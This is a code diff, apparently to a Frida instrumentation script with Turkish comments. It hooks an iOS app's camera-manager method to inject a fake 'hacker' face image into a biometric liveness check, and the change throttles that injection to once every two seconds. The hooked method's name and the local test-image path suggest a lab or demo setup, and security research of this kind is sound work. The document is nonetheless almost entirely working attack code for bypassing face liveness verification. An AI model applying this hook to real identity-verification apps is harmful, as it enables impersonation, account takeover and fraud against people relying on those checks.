@@ -21,23 +21,23 @@ if (ObjC.available) {
     if (AppCameraManager) {
         console.log("[+] HEDEF LIVENESS OKUYUCUSU BULUNDU: " + targetClassName);
         
+        var lastLogTime = 0;
+
         Interceptor.attach(AppCameraManager[triggerMethod].implementation, {
             onEnter: function(args) {
-                // Saniyede 1 kez yapay bir atış (Sensörden tetiklenme misali) gelir.
-                console.log("\n[💥] SENTINEL YAKALADI: Sensörden Veri Akışı Geldi!");
-                
-                // args[0] CameraManager objemizin referansı (self)
-                var cameraManagerInstance = new ObjC.Object(args[0]);
-                
-                // Sahte Hacker Resmini Hedefin RAM'inden İçeri İtiyoruz!
-                console.log("   [Aksiyon]: SAHTE YÜZ ENJEKTE EDİLDİ -> Liveness Kontrolüne Yollandı!");
-                
-                // /Users/kadirarici/Desktop/... yolunu kopyala ki iPhone CoreMedia onu renderlasın
-                var hackerImagePath = "/Users/kadirarici/Desktop/Biometric Logic Bypass/Sentinel_Hook/.local/test-faces/hacker.jpg";
-                var nsStringPath = ObjC.classes.NSString.stringWithString_(hackerImagePath);
-                
-                // Kamera manager'a sahte fotoğrafımızı (NSString olarak) gönder
-                cameraManagerInstance["- receiveHackerImage:"](nsStringPath);
+                var now = Date.now();
+                if (now - lastLogTime > 2000) {
+                    console.log("\n[💥] SENTINEL YAKALADI: Sensörden Veri Akışı Geldi! (Stabilize)");
+                    
+                    var cameraManagerInstance = new ObjC.Object(args[0]);
+                    console.log("   [Aksiyon]: SAHTE YÜZ ENJEKTE EDİLDİ -> Liveness Kontrolüne Yollandı!");
+                    
+                    var hackerImagePath = "/Users/kadirarici/Desktop/Biometric Logic Bypass/Sentinel_Hook/.local/test-faces/hacker.jpg";
+                    var nsStringPath = ObjC.classes.NSString.stringWithString_(hackerImagePath);
+                    
+                    cameraManagerInstance["- receiveHackerImage:"](nsStringPath);
+                    lastLogTime = now;
+                }
             }
         });
         
